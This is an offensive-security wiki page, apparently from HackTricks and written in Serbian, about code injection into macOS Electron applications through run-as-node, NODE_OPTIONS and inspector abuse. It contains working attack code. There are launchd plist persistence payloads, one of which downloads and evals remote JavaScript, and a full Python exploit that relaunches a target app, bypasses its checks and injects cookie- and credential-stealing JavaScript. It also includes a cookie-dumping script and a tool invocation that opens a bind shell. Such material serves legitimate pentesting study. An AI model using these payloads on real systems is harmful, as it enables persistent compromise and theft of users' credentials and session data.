# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Ako ne znate šta je Electron, [**ovde možete pronaći mnogo informacija**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Za sada je dovoljno da znate da Electron pokreće **node**.\
A node ima neke **parametre** i **env promenljive** koje se mogu koristiti da bi se **izvršio drugi kod**, pored navedenog fajla.

### Electron Fuses

Ove tehnike će biti opisane u nastavku, ali je Electron u novije vreme dodao nekoliko **bezbednosnih zastavica za njihovo sprečavanje**. To su [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), a ovo su one koje se koriste za **sprečavanje** Electron aplikacija na macOS-u da **učitavaju proizvoljan kod**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Ako je onemogućen, sprečava korišćenje env promenljive **`ELECTRON_RUN_AS_NODE`** za ubacivanje koda.
- **`EnableNodeCliInspectArguments`**: Ako je onemogućen, parametri kao što su `--inspect` i `--inspect-brk` neće biti uzeti u obzir. Na ovaj način se sprečava ubacivanje koda.
- **`EnableEmbeddedAsarIntegrityValidation`**: Ako je omogućen, učitani **`asar`** **fajl** će biti **proveren** od strane macOS-a. Na ovaj način se **sprečava** **ubacivanje koda** izmenom sadržaja ovog fajla.
- **`OnlyLoadAppFromAsar`**: Ako je ovo omogućeno, umesto pretrage i učitavanja sledećim redosledom: **`app.asar`**, **`app`** i na kraju **`default_app.asar`**, proveravaće i koristiti samo app.asar, čime se obezbeđuje da je, kada se **kombinuje** sa fuse-om **`embeddedAsarIntegrityValidation`**, **nemoguće** **učitati kod koji nije validiran**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Ako je omogućen, proces browser-a koristi fajl pod nazivom `browser_v8_context_snapshot.bin` za svoj V8 snapshot.

Još jedan zanimljiv fuse koji ne sprečava ubacivanje koda je:

- **EnableCookieEncryption**: Ako je omogućen, skladište kolačića na disku se šifruje pomoću kriptografskih ključeva na nivou OS-a.

### Provera Electron Fuses

Ove **zastavice** možete **proveriti** iz aplikacije pomoću:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifikovanje Electron Fuses

Kao što je navedeno u [**docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Electron Fuses** se nalazi unutar **Electron binary** datoteke, koja negde sadrži string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

U macOS aplikacijama, to se obično nalazi u `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Ovu datoteku možete učitati na [https://hexed.it/](https://hexed.it/) i pretražiti prethodni string. Nakon ovog stringa možete videti broj „0” ili „1” u ASCII formatu, koji označava da li je svaki fuse onemogućen ili omogućen. Samo izmenite hex kod (`0x30` je `0`, a `0x31` je `1`) da biste **izmenili vrednosti fuse-ova**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Imajte na umu da, ako pokušate da **prepišete** binarni fajl **`Electron Framework`** unutar aplikacije nakon izmene ovih bajtova, aplikacija se neće pokrenuti.

## RCE dodavanje koda u Electron Applications

Mogu postojati **eksterni JS/HTML fajlovi** koje Electron App koristi, pa bi napadač mogao da ubaci kod u te fajlove čiji se potpis neće proveravati i da izvrši proizvoljan kod u kontekstu aplikacije.

> [!CAUTION]
> Međutim, trenutno postoje 2 ograničenja:
>
> - Dozvola **`kTCCServiceSystemPolicyAppBundles`** je **potrebna** za izmenu App-a, tako da to podrazumevano više nije moguće.
> - Kompajlirani **`asap`** fajl obično ima omogućene fuse-ove **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`**
>
> Zbog toga je ovaj napadni put složeniji (ili nemoguć).

Imajte na umu da je moguće zaobići zahtev za **`kTCCServiceSystemPolicyAppBundles`** kopiranjem aplikacije u drugi direktorijum (kao što je **`/tmp`**), preimenovanjem foldera **`app.app/Contents`** u **`app.app/NotCon`**, **izmenom** **asar** fajla pomoću vašeg **malicious** koda, vraćanjem naziva u **`app.app/Contents`** i njegovim pokretanjem.<sup>[[5]](#references)</sup>

Kod iz asar fajla možete raspakovati pomoću:
```bash
npx asar extract app.asar app-decomp
```
I ponovo ga upakujte nakon što ga izmenite pomoću:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE sa ELECTRON_RUN_AS_NODE

Prema [**dokumentaciji**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ako je ova env promenljiva podešena, proces će se pokrenuti kao običan Node.js proces.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ako je fuse **`RunAsNode`** onemogućen, env var **`ELECTRON_RUN_AS_NODE`** biće ignorisan i ovo neće raditi.

### Injection iz App Plist-a

Kao što je [**ovde predloženo**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), mogli biste da zloupotrebite ovu env var u plist-u radi održavanja persistence:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE pomoću `NODE_OPTIONS`

Možete sačuvati payload u drugoj datoteci i izvršiti ga:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Ako je fuse **`EnableNodeOptionsEnvironmentVariable`** **onemogućen**, aplikacija će **ignorисati** env var **NODE_OPTIONS** prilikom pokretanja, osim ako je podešen env var **`ELECTRON_RUN_AS_NODE`**, koji će takođe biti **ignorisan** ako je fuse **`RunAsNode`** onemogućen.
>
> Ako ne podesite **`ELECTRON_RUN_AS_NODE`**, naići ćete na **grešku**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection iz App Plist-a

Ovaj env var možete zloupotrebiti u plist-u da biste održali persistence dodavanjem sledećih ključeva:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE uz inspecting

Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako pokrenete Electron aplikaciju sa flagovima kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **debug port će biti otvoren**, pa možete da se povežete na njega (na primer iz Chrome-a preko `chrome://inspect`) i moći ćete da **ubacite code u nju** ili čak da pokrenete nove procese.<sup>[[7]](#references)</sup>\
Na primer:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
U [**ovom blogpostu**](https://hackerone.com/reports/1274695), ovo debugging ponašanje se zloupotrebljava kako bi headless chrome **preuzimao proizvoljne fajlove na proizvoljne lokacije**.<sup>[[8]](#references)</sup>

> [!TIP]
> Ako aplikacija ima sopstveni način provere da li su env variables ili parametri kao što je `--inspect` podešeni, možete pokušati da ga **zaobiđete** tokom runtime-a pomoću argumenta `--inspect-brk`, koji će **zaustaviti izvršavanje** na početku aplikacije i izvršiti bypass (na primer, prepisivanjem argumenata ili env variables trenutnog procesa).

U nastavku je prikazan exploit kojim je, nadgledanjem i izvršavanjem aplikacije sa parametrom `--inspect-brk`, bilo moguće zaobići njenu custom zaštitu (prepisivanjem parametara procesa kako bi se uklonio `--inspect`), a zatim ubaciti JS payload za preuzimanje cookies i credentials iz aplikacije:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Ako je fuse **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **ignorisati node parametre** (kao što je `--inspect`) prilikom pokretanja, osim ako je postavljena env promenljiva **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **ignorisana** ako je fuse **`RunAsNode`** onemogućen.
>
> Međutim, i dalje možete koristiti **electron parametar `--remote-debugging-port=9229`**, ali prethodni payload neće raditi za izvršavanje drugih procesa.

Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti određene informacije iz Electron App-a, kao što su **history** (pomoću GET komandi) ili **cookies** browsera (pošto su **decrypted** unutar browsera i postoji **json endpoint** koji će ih izlistati).

Kako to možete učiniti saznajte [**ovde**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**ovde**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), a možete koristiti automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ili jednostavnu skriptu poput:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Ovu env promenljivu možete zloupotrebiti u plist-u kako biste održali persistence dodavanjem sledećih ključeva:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Zaobilaženje TCC-a zloupotrebom starijih verzija

> [!TIP]
> TCC daemon iz macOS-a ne proverava verziju pokrenute aplikacije. Zato, ako **ne možete da ubacite kod u Electron aplikaciju** pomoću neke od prethodnih tehnika, možete preuzeti prethodnu verziju APP-a i ubaciti kod u nju, jer će i dalje dobiti TCC privilegije (osim ako je Trust Cache ne spreči).

## Pokretanje koda koji nije JS

Prethodne tehnike omogućiće vam da pokrenete **JS kod unutar procesa Electron aplikacije**. Međutim, imajte na umu da se **child processes pokreću u okviru istog sandbox profila** kao i parent aplikacija i **nasleđuju njene TCC dozvole**.\
Zato, ako želite da zloupotrebite entitlements za pristup kameri ili mikrofonu, na primer, možete jednostavno **pokrenuti drugi binary iz tog procesa**.

## Značajne Electron macOS ranjivosti (2023–2024)

### CVE-2023-44402 – zaobilaženje ASAR integriteta

Electron ≤22.3.23 i različita 23–27 pre-release izdanja omogućavali su napadaču sa pravom upisa u fasciklu `.app/Contents/Resources` da zaobiđe fuse-ove `embeddedAsarIntegrityValidation` **i** `onlyLoadAppFromAsar`. Greška je bila *file-type confusion* u proveri integriteta, koja je omogućavala da se učita **directory pod nazivom `app.asar`** umesto validirane arhive, pa bi se bilo koji JavaScript smešten u tom directory-ju izvršio pri pokretanju aplikacije. Zbog toga su na macOS-u i dalje bili ranjivi čak i vendor-i koji su pratili hardening smernice i omogućili oba fuse-a.<sup>[[3]](#references)</sup>

Zakrpane Electron verzije: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** i **27.0.0-alpha.7**. Napadači koji pronađu aplikaciju koja koristi stariji build mogu zameniti `Contents/Resources/app.asar` sopstvenim directory-jem i izvršiti kod sa TCC entitlements aplikacije.<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

U januaru 2024. serija CVE-ova (CVE-2024-23738 do CVE-2024-23743) ukazala je na to da se mnoge Electron aplikacije isporučuju sa fuse-ovima **RunAsNode** i **EnableNodeCliInspectArguments** i dalje omogućenim. Lokalni napadač zato može ponovo pokrenuti program sa environment variable-om `ELECTRON_RUN_AS_NODE=1` ili flag-ovima kao što je `--inspect-brk`, kako bi ga pretvorio u *generic* Node.js process i nasleđivao sve sandbox i TCC dozvole aplikacije.<sup>[[4]](#references)</sup>

Iako je Electron team osporio ocenu „critical” i naveo da napadaču već treba local code-execution, ovaj problem je i dalje koristan tokom post-exploitation faze, jer svaki ranjivi Electron bundle pretvara u *living-off-the-land* binary koji, na primer, može da čita Contacts, Photos ili druge osetljive resurse kojima je desktop aplikacija prethodno dobila pristup.<sup>[[4]](#references)</sup>

Defensive guidance Electron maintainers-a:<sup>[[4]](#references)</sup>

* Onemogućite fuse-ove `RunAsNode` i `EnableNodeCliInspectArguments` u production build-ovima.
* Koristite noviji **UtilityProcess** API ako je vašoj aplikaciji legitimno potreban pomoćni Node.js process, umesto da ponovo omogućavate te fuse-ove.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) može se jednostavno koristiti za **pronalaženje ranjivih electron aplikacija** koje su instalirane i ubacivanje koda u njih. Ovaj tool će pokušati da koristi **`--inspect`** tehniku:<sup>[[5]](#references)</sup>

Potrebno je da ga sami compile-ujete, a možete ga koristiti ovako:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki je dizajniran za backdoorovanje Electron aplikacija zamenom JavaScript datoteka aplikacije Loki Command & Control JavaScript datotekama.

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [MacOS Injection via Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR Integrity bypass via filetype confusion (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Statement regarding 'runAsNode' CVEs - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - A New Weapon in Your Red Teaming Armory - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Why Electron apps can't store your secrets confidentially: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging abused to download arbitrary files](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Dumping Cookies with Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging Cookie Dumping Failures with Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
